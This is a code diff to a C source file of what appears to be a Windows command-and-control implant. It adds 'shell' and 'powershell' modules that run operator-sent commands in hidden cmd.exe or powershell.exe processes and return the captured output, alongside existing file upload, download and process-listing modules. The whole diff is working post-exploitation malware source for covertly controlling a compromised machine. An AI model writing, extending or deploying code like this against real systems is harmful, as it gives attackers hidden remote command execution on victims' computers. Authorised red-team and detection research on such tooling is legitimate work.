@@ -1,8 +1,9 @@
 /*
  * modules.c — System info collection and native module implementations.
- * All operations use Win32 API directly — no child processes spawned.
+ * All operations use Win32 API directly — no child processes spawned
+ * (except shell/powershell which intentionally spawn cmd.exe/powershell.exe).
  *
- * Modules: whoami, ps, ls, cat, upload, download
+ * Modules: whoami, ps, ls, cat, upload, download, shell, powershell
  */
 #include "agent.h"
 
@@ -389,12 +390,112 @@ void mod_download(Buffer *out, const char *path) {
     CloseHandle(hFile);
 }
 
+/* ─── Module: shell / powershell (DANGER: spawns child process) ─── */
+
+static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershell) {
+    /*
+     * Spawn cmd.exe /c <cmd> or powershell.exe -NoProfile -NonInteractive -Command <cmd>
+     * Capture stdout + stderr via anonymous pipes.
+     * This is the ONE case where we intentionally spawn a child process.
+     */
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
+    HANDLE hStderrRead = NULL, hStderrWrite = NULL;
+
+    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0) ||
+        !CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) {
+        buf_append(out, "Failed to create pipes\n", 23);
+        return;
+    }
+
+    /* Ensure read ends are NOT inherited */
+    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);
+
+    /* Build command line */
+    char full_cmd[8192];
+    if (use_powershell) {
+        snprintf(full_cmd, sizeof(full_cmd),
+                 "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd_line);
+    } else {
+        snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd_line);
+    }
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hStdoutWrite;
+    si.hStdError = hStderrWrite;
+    si.hStdInput = NULL;
+    si.wShowWindow = SW_HIDE;
+    memset(&pi, 0, sizeof(pi));
+
+    DBG("[shell] executing: %s", full_cmd);
+
+    if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
+                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        char err[256];
+        snprintf(err, sizeof(err), "CreateProcess failed (err=%lu)\n", GetLastError());
+        buf_append(out, err, (DWORD)strlen(err));
+        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
+        CloseHandle(hStderrRead); CloseHandle(hStderrWrite);
+        return;
+    }
+
+    /* Close write ends in parent — child has them */
+    CloseHandle(hStdoutWrite);
+    CloseHandle(hStderrWrite);
+
+    /* Wait for process with timeout (30 seconds) */
+    WaitForSingleObject(pi.hProcess, 30000);
+
+    /* Read stdout */
+    DWORD bytes_read;
+    char read_buf[4096];
+    while (TRUE) {
+        DWORD avail = 0;
+        PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &avail, NULL);
+        if (avail == 0) break;
+        if (ReadFile(hStdoutRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
+            buf_append(out, read_buf, bytes_read);
+        } else {
+            break;
+        }
+    }
+
+    /* Read stderr */
+    while (TRUE) {
+        DWORD avail = 0;
+        PeekNamedPipe(hStderrRead, NULL, 0, NULL, &avail, NULL);
+        if (avail == 0) break;
+        if (ReadFile(hStderrRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
+            buf_append(out, "[STDERR] ", 9);
+            buf_append(out, read_buf, bytes_read);
+        } else {
+            break;
+        }
+    }
+
+    CloseHandle(hStdoutRead);
+    CloseHandle(hStderrRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
 /* ─── Module dispatch ─── */
 
 BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                     unsigned char **result, DWORD *result_len) {
     Buffer out;
     buf_init(&out, 4096);
+
+    DBG("[module] executing module '%s' (args_len=%u)", name, args_len);
 
     ArgParser ap;
     arg_parse_init(&ap, args, args_len);
@@ -422,6 +523,23 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
     else if (strcmp(name, "download") == 0) {
         const char *path = arg_extract_str(&ap);
         mod_download(&out, path);
+    }
+    else if (strcmp(name, "shell") == 0 || strcmp(name, "powershell") == 0) {
+        /*
+         * shell/powershell: arguments come as raw UTF-8 bytes (NOT BeaconDataParse format).
+         * The operator CLI sends the command string directly.
+         */
+        BOOL use_ps = (strcmp(name, "powershell") == 0);
+        if (args && args_len > 0) {
+            /* Null-terminate the command string */
+            char *cmd_str = (char *)malloc(args_len + 1);
+            memcpy(cmd_str, args, args_len);
+            cmd_str[args_len] = '\0';
+            mod_shell_exec(&out, cmd_str, use_ps);
+            free(cmd_str);
+        } else {
+            buf_append(&out, "No command specified\n", 20);
+        }
     }
     else {
         char err[256];
